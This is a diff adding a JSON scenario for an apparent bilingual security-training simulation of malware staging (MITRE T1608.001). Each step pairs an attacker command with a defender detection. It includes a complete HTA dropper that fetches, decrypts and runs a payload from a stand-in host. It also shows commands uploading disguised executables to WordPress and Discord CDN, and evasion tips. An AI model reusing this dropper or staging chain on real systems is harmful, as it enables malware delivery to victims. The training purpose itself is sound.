@@ -1,0 +1,186 @@
+{
+  "id": "T1608.001",
+  "title": "악성코드 업로드 시뮬레이션",
+  "titleEn": "Upload Malware Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 인프라 준비", "labelEn": "🔍 Infrastructure Prep", "steps": [0, 1] },
+    { "label": "⚡ 페이로드 업로드", "labelEn": "⚡ Payload Upload", "steps": [2, 3] },
+    { "label": "✅ 배포 테스트", "labelEn": "✅ Delivery Test", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "wp", "label": "Compromised WP", "x": 200, "y": 30 },
+    { "id": "discord", "label": "Discord CDN", "x": 200, "y": 90 },
+    { "id": "staged", "label": "Staged Payload", "x": 350, "y": 60 },
+    { "id": "victim", "label": "Victim PC", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "wp", "minStep": 0 },
+    { "from": "ext", "to": "discord", "minStep": 2 },
+    { "from": "wp", "to": "staged", "minStep": 1 },
+    { "from": "discord", "to": "staged", "minStep": 2 },
+    { "from": "staged", "to": "victim", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "payload.exe", "icon": "⚙️", "alert": true },
+    { "name": "dropper.hta", "icon": "📄" },
+    { "name": "stage2.enc", "icon": "🔐" }
+  ],
+  "steps": [
+    {
+      "cmd": "python3 wp_exploit.py --target https://tech-blog[.]com --vuln CVE-2025-XXXX --upload payload.exe --path /wp-content/uploads/2026/03/",
+      "out": "[*] WordPress Exploit — CVE-2025-XXXX (Arbitrary File Upload)\n[*] Target: https://tech-blog[.]com\n[*] Uploading payload.exe as 'invoice-scanner-v2.exe'...\n[+] Upload successful!\n[+] URL: https://tech-blog[.]com/wp-content/uploads/2026/03/invoice-scanner-v2.exe\n[+] File size: 842,752 bytes\n[+] Server: Apache/2.4.58, PHP 8.2\n[+] Site reputation: Clean (Alexa rank #45,231)\n\n[*] Testing download...\n[+] HTTP 200 OK — File accessible",
+      "def": "[WAF] Suspicious file upload to WordPress — executable file disguised as document scanner",
+      "defAction": "Source: Attacker IP → tech-blog[.]com\nTarget: /wp-content/uploads/2026/03/\nAction: File quarantined, WordPress admin notified",
+      "desc": "해킹된 WordPress 사이트에 악성코드를 업로드합니다. 사이트의 높은 도메인 평판을 악용합니다.",
+      "descEn": "Uploading malware to a compromised WordPress site. Exploiting the site's high domain reputation.",
+      "stepTitle": "WordPress 사이트에 악성코드 업로드",
+      "stepTitleEn": "Malware Upload to WordPress Site",
+      "feynman": "평판 좋은 가게에 몰래 가짜 상품을 진열하는 것입니다. 합법적인 기술 블로그의 파일 업로드 취약점을 악용하여 악성코드를 올립니다. 이 사이트는 보안 장비에서 '안전한 사이트'로 분류되어 있으므로 다운로드가 차단되지 않습니다.",
+      "feynmanEn": "Like secretly placing counterfeit goods in a reputable store. Exploiting a legitimate tech blog's file upload vulnerability to host malware. Since this site is classified as 'safe' by security tools, downloads won't be blocked.",
+      "expert": "WordPress의 파일 업로드 취약점은 /wp-content/uploads/ 경로에 임의 파일을 저장합니다. 높은 Alexa 랭킹과 Clean 평판은 URL 필터링 우회에 핵심적입니다.",
+      "expertEn": "WordPress file upload vulnerabilities store arbitrary files in /wp-content/uploads/. High Alexa ranking and clean reputation are critical for URL filtering bypass.",
+      "defTooltip": "🔗 WAF: WordPress에 실행 파일 업로드 탐지",
+      "defTooltipEn": "🔗 WAF: Executable file upload to WordPress detected",
+      "hackerLog": {
+        "title": "wp_upload.log",
+        "lines": [
+          { "log": "Site: tech-blog.com (Alexa #45,231)", "desc": "💡 높은 평판의 합법 사이트 — URL 필터 우회" },
+          { "log": "Path: /wp-content/uploads/2026/03/", "desc": "💡 WordPress 기본 업로드 경로 — 정상 파일과 혼합" },
+          { "log": "File: invoice-scanner-v2.exe", "desc": "💡 정상 소프트웨어로 위장한 악성코드" }
+        ]
+      },
+      "terms": [
+        { "name": "스테이징", "desc": "악성코드를 다운로드 가능한 위치에 미리 배치하는 행위. 직접 전송 대신 피해자가 다운로드하도록 유도." },
+        { "name": "도메인 평판", "desc": "보안 장비가 도메인의 신뢰도를 평가하는 점수. 오래된 합법 사이트일수록 높은 평판을 가짐." }
+      ]
+    },
+    {
+      "cmd": "openssl enc -aes-256-cbc -in beacon_stager.exe -out stage2.enc -k 'S3cr3tK3y!' -pbkdf2 && python3 -c \"\nimport base64\nwith open('stage2.enc','rb') as f: data=f.read()\nwith open('stage2.b64','w') as f: f.write(base64.b64encode(data).decode())\nprint(f'Encrypted payload: {len(data)} bytes')\nprint(f'Base64 encoded: stage2.b64 ({len(base64.b64encode(data))} bytes)')\n\" && scp stage2.b64 root@staging-vps[.]com:/var/www/html/assets/telemetry.js",
+      "out": "Encrypted payload: 524288 bytes\nBase64 encoded: stage2.b64 (699052 bytes)\n\nstage2.b64        100%  682KB  45.2MB/s   00:00\n\n[+] Encrypted stager uploaded as telemetry.js\n[+] URL: https://staging-vps[.]com/assets/telemetry.js\n[+] File appears as JavaScript library to casual inspection",
+      "def": "[Network] Large Base64-encoded file uploaded to VPS — disguised as JavaScript library",
+      "defAction": "Source: Attacker → staging-vps[.]com\nTarget: /var/www/html/assets/telemetry.js\nAction: File content analysis reveals encrypted binary, not valid JavaScript",
+      "desc": "2단계 페이로드를 AES-256으로 암호화하고 Base64 인코딩하여 JS 파일로 위장합니다.",
+      "descEn": "Encrypting 2nd stage payload with AES-256 and Base64 encoding, disguised as a JS file.",
+      "stepTitle": "암호화된 페이로드 스테이징",
+      "stepTitleEn": "Encrypted Payload Staging",
+      "feynman": "비밀 편지를 암호로 쓴 뒤 일반 봉투에 넣는 것입니다. 악성코드를 AES-256으로 암호화하면 내용을 알 수 없고, Base64로 인코딩하면 텍스트처럼 보입니다. telemetry.js라는 파일명으로 위장하면 보안 장비가 정상 자바스크립트 파일로 판단합니다.",
+      "feynmanEn": "Like writing a secret letter in code and putting it in a normal envelope. AES-256 encryption makes content unreadable, Base64 encoding makes it look like text. Disguising as telemetry.js makes security tools see it as a normal JavaScript file.",
+      "expert": "AES-256-CBC + PBKDF2 암호화된 페이로드는 네트워크 DLP에서 내용 분석이 불가능합니다. Base64 인코딩으로 바이너리 시그니처도 제거되어 파일 타입 감지를 우회합니다.",
+      "expertEn": "AES-256-CBC + PBKDF2 encrypted payloads prevent network DLP content analysis. Base64 encoding removes binary signatures, bypassing file type detection.",
+      "defTooltip": "🔗 네트워크: JS로 위장된 대용량 Base64 파일 업로드 감지",
+      "defTooltipEn": "🔗 Network: Large Base64 file disguised as JS uploaded detected",
+      "hackerLog": {
+        "title": "encrypt_stage.log",
+        "lines": [
+          { "log": "Encryption: AES-256-CBC + PBKDF2", "desc": "💡 군사급 암호화 — 네트워크 검사 불가" },
+          { "log": "Disguise: telemetry.js", "desc": "💡 자바스크립트 파일로 위장 — 확장자 필터 우회" },
+          { "log": "Size: 682KB (Base64)", "desc": "💡 일반 JS 라이브러리와 유사한 크기" }
+        ]
+      },
+      "terms": [
+        { "name": "AES-256", "desc": "Advanced Encryption Standard 256비트. 군사급 대칭 암호화. 키 없이는 복호화 불가능." },
+        { "name": "다단계 페이로드", "desc": "1단계 드로퍼가 실행되면 2단계 메인 페이로드를 다운로드하는 구조. 초기 파일 크기와 탐지를 최소화." }
+      ]
+    },
+    {
+      "cmd": "curl -X POST 'https://discord.com/api/v9/channels/1234567890/messages' -H 'Authorization: Bot BOT_TOKEN' -F 'file=@raccoon_loader.exe;filename=Discord-Nitro-Generator.exe' | jq '{id: .id, attachment_url: .attachments[0].url}'",
+      "out": "{\n  \"id\": \"1234567890123456\",\n  \"attachment_url\": \"https://cdn.discordapp.com/attachments/1234567890/9876543210/Discord-Nitro-Generator.exe\"\n}\n\n[+] Payload uploaded to Discord CDN\n[+] URL: https://cdn.discordapp.com/attachments/.../Discord-Nitro-Generator.exe\n[+] CDN: Cloudflare (high reputation)\n[+] HTTPS: Valid Discord certificate\n[+] Deletion: Message can be deleted, but CDN URL persists",
+      "def": "[Threat Intel] Executable uploaded to Discord CDN disguised as Nitro generator — known malware delivery pattern",
+      "defAction": "Source: Discord CDN\nTarget: Discord-Nitro-Generator.exe\nAction: URL added to blocklist, Discord Trust & Safety notified",
+      "desc": "Discord CDN에 악성코드를 업로드합니다. Discord의 높은 도메인 평판과 Cloudflare CDN을 악용합니다.",
+      "descEn": "Uploading malware to Discord CDN. Exploiting Discord's high domain reputation and Cloudflare CDN.",
+      "stepTitle": "Discord CDN 악용",
+      "stepTitleEn": "Discord CDN Abuse",
+      "feynman": "유명 택배 회사의 배송 시스템을 이용해 위험물을 보내는 것입니다. Discord CDN(cdn.discordapp.com)은 대부분의 보안 장비에서 허용 목록에 있습니다. 'Discord Nitro 생성기'로 위장하면 게이머들이 직접 다운로드합니다.",
+      "feynmanEn": "Like using a famous courier's delivery system to send dangerous goods. Discord CDN is on most security tools' allow lists. Disguising as 'Discord Nitro Generator' tricks gamers into downloading.",
+      "expert": "Discord CDN URL은 메시지가 삭제되어도 한동안 유효합니다. cdn.discordapp.com은 Cloudflare 뒤에 있어 IP 기반 차단이 어렵습니다.",
+      "expertEn": "Discord CDN URLs remain valid even after message deletion. cdn.discordapp.com is behind Cloudflare, making IP-based blocking difficult.",
+      "defTooltip": "🔗 위협 인텔: Discord CDN에서 실행 파일 배포 패턴 감지",
+      "defTooltipEn": "🔗 Threat Intel: Executable distribution pattern on Discord CDN detected",
+      "hackerLog": {
+        "title": "discord_upload.log",
+        "lines": [
+          { "log": "CDN: cdn.discordapp.com (Cloudflare)", "desc": "💡 높은 평판 CDN — URL 필터링 우회" },
+          { "log": "Disguise: Discord-Nitro-Generator.exe", "desc": "💡 게이머 대상 소셜 엔지니어링" },
+          { "log": "Persistence: URL survives message deletion", "desc": "💡 메시지 삭제 후에도 다운로드 링크 유효" }
+        ]
+      },
+      "terms": [
+        { "name": "Discord CDN", "desc": "Discord의 파일 호스팅 서비스. cdn.discordapp.com 도메인으로 Cloudflare를 통해 제공." },
+        { "name": "Living off Trusted Sites", "desc": "합법적인 웹 서비스를 악용하여 보안 필터링을 우회하는 전략. LoTS라고도 함." }
+      ]
+    },
+    {
+      "cmd": "cat > dropper.hta << 'HTA'\n<html><head><script language=\"VBScript\">\nSub Window_OnLoad\n  Set s = CreateObject(\"Wscript.Shell\")\n  s.Run \"powershell -ep bypass -w hidden -c \\\"$k='S3cr3tK3y!';$d=(New-Object Net.WebClient).DownloadString('https://staging-vps[.]com/assets/telemetry.js');$b=[Convert]::FromBase64String($d);$p=[IO.Path]::GetTempPath()+'svchost.exe';[IO.File]::WriteAllBytes($p,(New-Object Security.Cryptography.AesCryptoServiceProvider|%{$_.Key=[Text.Encoding]::UTF8.GetBytes($k.PadRight(32));$_.IV=New-Object byte[] 16;$_.CreateDecryptor()}).TransformFinalBlock($b,0,$b.Length));Start-Process $p\\\"\", 0, False\nEnd Sub\n</script></head><body></body></html>\nHTA\necho '[+] HTA dropper created: dropper.hta'",
+      "out": "[+] HTA dropper created: dropper.hta\n\n[*] Dropper chain:\n    1. User opens dropper.hta\n    2. HTA executes hidden PowerShell\n    3. PowerShell downloads stage2 from staging-vps\n    4. Decrypts AES-256 payload in memory\n    5. Writes to %TEMP%\\svchost.exe\n    6. Executes decrypted payload\n\n[*] File size: 842 bytes (small dropper)\n[*] Detection: 3/68 (4.4%) — HTA is rarely scanned",
+      "def": "[Email Gateway] HTA attachment detected in email — known dropper format blocked",
+      "defAction": "Source: Phishing email\nTarget: {companyName} employee inbox\nAction: HTA attachment stripped, sender domain blacklisted",
+      "desc": "1단계 HTA 드로퍼를 생성합니다. 이 드로퍼가 스테이징된 암호화 페이로드를 다운로드하고 복호화합니다.",
+      "descEn": "Creating a 1st stage HTA dropper. This dropper downloads and decrypts the staged encrypted payload.",
+      "stepTitle": "HTA 드로퍼 생성",
+      "stepTitleEn": "HTA Dropper Creation",
+      "feynman": "주소가 적힌 메모(드로퍼)를 받으면, 그 주소의 가게(스테이징 서버)에서 암호화된 상자(페이로드)를 가져와 열쇠(AES 키)로 여는 자동 프로세스입니다. HTA 파일은 HTML처럼 보이지만 Windows에서 프로그램 코드를 실행할 수 있어 위험합니다.",
+      "feynmanEn": "Like receiving a note with an address (dropper) that triggers an automated process to pick up an encrypted box (payload) from a store (staging server) and open it with a key (AES key). HTA files look like HTML but can execute code on Windows.",
+      "expert": "HTA 드로퍼는 IE/MSHTML 엔진을 통해 VBScript를 실행합니다. PowerShell -w hidden으로 콘솔 창을 숨기고, AES 복호화를 메모리에서 수행하여 디스크 기반 탐지를 최소화합니다.",
+      "expertEn": "HTA dropper executes VBScript through IE/MSHTML engine. PowerShell -w hidden conceals the console, and AES decryption in memory minimizes disk-based detection.",
+      "defTooltip": "🔗 이메일 게이트웨이: HTA 첨부 파일 — 알려진 드로퍼 형식 차단",
+      "defTooltipEn": "🔗 Email Gateway: HTA attachment — known dropper format blocked",
+      "hackerLog": {
+        "title": "dropper_gen.log",
+        "lines": [
+          { "log": "Dropper: dropper.hta (842 bytes)", "desc": "💡 매우 작은 파일 크기 — 의심을 줄임" },
+          { "log": "Chain: HTA → PowerShell → AES decrypt → Execute", "desc": "💡 4단계 실행 체인 — 각 단계에서 탐지 회피" },
+          { "log": "VT: 3/68 (4.4%)", "desc": "💡 HTA 형식은 AV 탐지율이 매우 낮음" }
+        ]
+      },
+      "terms": [
+        { "name": "HTA", "desc": "HTML Application. Windows에서 HTML+VBScript를 로컬 애플리케이션으로 실행하는 파일 형식." },
+        { "name": "드로퍼", "desc": "추가 악성코드를 다운로드/실행하는 작은 프로그램. 1단계 감염에 사용되는 경량 페이로드." }
+      ]
+    },
+    {
+      "cmd": "python3 -c \"\nprint('=== Staged Payload Delivery Test ===')\nprint()\nprint('[1] WordPress staged payload')\nprint('    URL: https://tech-blog[.]com/wp-content/uploads/2026/03/invoice-scanner-v2.exe')\nprint('    Test: curl -I → HTTP 200 OK')\nprint('    SmartScreen: PASS (high reputation domain)')\nprint('    VT URL: 0/90 detection')\nprint()\nprint('[2] Encrypted stage2 on VPS')\nprint('    URL: https://staging-vps[.]com/assets/telemetry.js')\nprint('    Test: curl -s | wc -c → 699,052 bytes (OK)')\nprint('    Content-Type: application/javascript (disguised)')\nprint()\nprint('[3] Discord CDN payload')\nprint('    URL: https://cdn.discordapp.com/attachments/.../Discord-Nitro-Generator.exe')\nprint('    Test: wget → Downloaded OK')\nprint('    Proxy: PASS (Discord whitelisted)')\nprint()\nprint('[✅] All staging infrastructure operational')\nprint('[✅] Ready for phishing campaign launch')\n\"",
+      "out": "=== Staged Payload Delivery Test ===\n\n[1] WordPress staged payload\n    URL: https://tech-blog[.]com/wp-content/uploads/2026/03/invoice-scanner-v2.exe\n    Test: curl -I → HTTP 200 OK\n    SmartScreen: PASS (high reputation domain)\n    VT URL: 0/90 detection\n\n[2] Encrypted stage2 on VPS\n    URL: https://staging-vps[.]com/assets/telemetry.js\n    Test: curl -s | wc -c → 699,052 bytes (OK)\n    Content-Type: application/javascript (disguised)\n\n[3] Discord CDN payload\n    URL: https://cdn.discordapp.com/attachments/.../Discord-Nitro-Generator.exe\n    Test: wget → Downloaded OK\n    Proxy: PASS (Discord whitelisted)\n\n[✅] All staging infrastructure operational\n[✅] Ready for phishing campaign launch",
+      "def": "[SIEM] Multi-platform malware staging infrastructure detected — coordinated campaign preparation",
+      "defAction": "Source: Multiple staging platforms\nTarget: {companyName} perimeter\nAction: All staging URLs blocked, employee alert issued, IR team on standby",
+      "desc": "모든 스테이징 인프라의 가용성을 테스트합니다. WordPress, VPS, Discord CDN 3개 채널이 운영 중입니다.",
+      "descEn": "Testing availability of all staging infrastructure. WordPress, VPS, and Discord CDN channels are operational.",
+      "stepTitle": "스테이징 인프라 검증",
+      "stepTitleEn": "Staging Infrastructure Verification",
+      "feynman": "모든 배송 경로가 정상 작동하는지 최종 점검하는 것입니다. 3개의 서로 다른 채널에 악성코드를 배치했으므로, 하나가 차단되어도 나머지 경로로 배포할 수 있습니다. 이런 다중 채널 전략은 탐지와 차단을 어렵게 만듭니다.",
+      "feynmanEn": "Like doing final checks that all delivery routes are working. Malware is placed on 3 different channels, so if one is blocked, others remain available. This multi-channel strategy makes detection and blocking difficult.",
+      "expert": "다중 스테이징 인프라는 단일 장애점을 제거합니다. 합법 서비스(WordPress, Discord CDN)와 자체 VPS를 혼합하면 URL 기반 차단의 효과를 크게 감소시킵니다.",
+      "expertEn": "Multiple staging infrastructure eliminates single points of failure. Mixing legitimate services (WordPress, Discord CDN) with VPS significantly reduces URL-based blocking effectiveness.",
+      "defTooltip": "🔗 SIEM: 다중 플랫폼 악성코드 스테이징 인프라 감지",
+      "defTooltipEn": "🔗 SIEM: Multi-platform malware staging infrastructure detected",
+      "hackerLog": {
+        "title": "staging_test.log",
+        "lines": [
+          { "log": "WordPress: HTTP 200 + SmartScreen PASS", "desc": "💡 합법 사이트 평판으로 보안 필터 우회" },
+          { "log": "VPS: telemetry.js disguise OK", "desc": "💡 암호화 페이로드가 JS 파일로 위장 성공" },
+          { "log": "Discord: Proxy whitelist PASS", "desc": "💡 Discord CDN은 대부분 기업에서 허용" }
+        ]
+      },
+      "terms": [
+        { "name": "다중 채널 스테이징", "desc": "여러 플랫폼에 동시에 페이로드를 배치하여 차단 시 대체 경로를 확보하는 전략." },
+        { "name": "VirusTotal URL", "desc": "URL의 악성 여부를 90개 이상의 보안 엔진으로 검사하는 서비스." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "pid": 1, "name": "init", "children": [
+      { "pid": 1200, "name": "bash", "children": [
+        { "pid": 1201, "name": "wp_exploit.py (upload)", "children": [] },
+        { "pid": 1205, "name": "openssl enc (AES)", "children": [
+          { "pid": 1206, "name": "scp stage2.b64", "children": [] }
+        ]},
+        { "pid": 1210, "name": "curl (Discord CDN)", "children": [] },
+        { "pid": 1215, "name": "dropper.hta (creation)", "children": [] },
+        { "pid": 1220, "name": "staging validation", "children": [] }
+      ]}
+    ]}
+  ]
+}
